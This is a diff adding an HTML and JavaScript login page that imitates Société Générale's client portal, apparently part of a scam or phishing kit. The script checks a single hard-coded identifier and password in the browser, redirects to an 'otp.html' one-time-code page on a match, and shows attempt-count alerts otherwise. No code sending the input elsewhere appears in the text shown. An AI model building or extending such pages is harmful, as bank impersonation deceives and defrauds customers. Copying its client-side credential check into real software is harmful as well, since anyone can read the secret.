@@ -1,0 +1,238 @@
+
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Société Générale - Connexion</title>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Arial', sans-serif;
+    }
+
+    body {
+      background: #f5f5f5;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+    }
+
+    .login-container {
+      background: white;
+      padding: 2.5rem;
+      border-radius: 15px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 450px;
+      z-index: 10;
+      position: relative;
+    }
+
+    .bank-header {
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+
+    .bank-logo {
+      width: 100px;
+      margin-bottom: 1rem;
+    }
+
+    h1 {
+      color: #E30613;
+      font-size: 1.8rem;
+      margin-bottom: 0.5rem;
+    }
+
+    .subtitle {
+      color: #666;
+      font-size: 0.9rem;
+      margin-bottom: 2rem;
+    }
+
+    .form-group {
+      margin-bottom: 1.5rem;
+      position: relative;
+    }
+
+    .form-group i {
+      position: absolute;
+      left: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #888;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px 12px 12px 40px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 1rem;
+      transition: border-color 0.3s ease;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #E30613;
+      box-shadow: 0 0 0 3px rgba(227,6,19,0.1);
+    }
+
+    button {
+      background: #E30613;
+      color: white;
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 8px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: #C10510;
+    }
+
+    .links {
+      margin-top: 1.5rem;
+      text-align: center;
+    }
+
+    .links a {
+      color: #E30613;
+      text-decoration: none;
+      font-size: 0.9rem;
+      margin: 0 10px;
+      transition: color 0.3s ease;
+    }
+
+    .links a:hover {
+      color: #C10510;
+    }
+
+    @media (max-width: 480px) {
+      .login-container {
+        padding: 1.5rem;
+        margin: 1rem;
+      }
+    }
+
+    /* Style pour l'écran de chargement */
+    .loading-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 20;
+      display: none;
+    }
+
+    .loading-spinner {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #E30613;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="loading-overlay" id="loading-overlay">
+    <div class="loading-spinner"></div>
+  </div>
+
+  <div class="login-container">
+    <div class="bank-header">
+      <img src="logo.png" alt="Société Générale" class="bank-logo">
+      <h1>Espace Client</h1>
+      <p class="subtitle">Accédez à votre espace bancaire sécurisé</p>
+    </div>
+    <form>
+      <div class="form-group">
+        <i class="fas fa-user"></i>
+        <input type="text" placeholder="Identifiant" required>
+      </div>
+      <div class="form-group">
+        <i class="fas fa-lock"></i>
+        <input type="password" placeholder="Mot de passe" required>
+      </div>
+      <button type="submit">Se connecter <i class="fas fa-arrow-right"></i></button>
+    </form>
+    <div class="links">
+      <a href="#">Identifiant oublié ?</a>
+      <a href="#">Créer un compte</a>
+    </div>
+  </div>
+
+  <script>
+    // Variables de comptage des tentatives
+    let attemptCount = 0;
+
+    // Sélectionner le formulaire et les champs de saisie
+    const form = document.querySelector('form');
+    const usernameInput = document.querySelector('input[type="text"]');
+    const passwordInput = document.querySelector('input[type="password"]');
+    const loadingOverlay = document.getElementById('loading-overlay');
+
+    // Fonction pour vérifier les identifiants
+    form.addEventListener('submit', function(e) {
+      e.preventDefault(); // Empêche l'envoi du formulaire
+
+      const username = usernameInput.value;
+      const password = passwordInput.value;
+
+      // Afficher l'écran de chargement
+      loadingOverlay.style.display = 'flex';
+
+      // Simuler un délai de 3 secondes
+      setTimeout(function() {
+        // Identifiants corrects
+        const correctUsername = '07676223';
+        const correctPassword = 'lefebvre995';
+
+        // Vérification des identifiants
+        if (username === correctUsername && password === correctPassword) {
+          // Si les identifiants sont corrects, rediriger vers otp.html
+          window.location.href = 'otp.html';
+        } else {
+          // Si les identifiants sont incorrects, augmenter le compteur de tentatives
+          attemptCount++;
+
+          if (attemptCount >= 3) {
+            // Si 3 tentatives échouées, afficher un message de blocage
+            alert('Compte va être bloqué après trop de tentatives incorrectes.');
+          } else {
+            // Si l'utilisateur a encore des tentatives, afficher un message d'erreur
+            alert('Identifiant ou mot de passe incorrect. Tentatives restantes : ' + (3 - attemptCount));
+          }
+        }
+
+        // Masquer l'écran de chargement après 3 secondes
+        loadingOverlay.style.display = 'none';
+
+        // Réinitialiser les champs de saisie
+        usernameInput.value = '';
+        passwordInput.value = '';
+      }, 3000); // Délai de 3 secondes
+    });
+  </script>
+</body>
+</html>
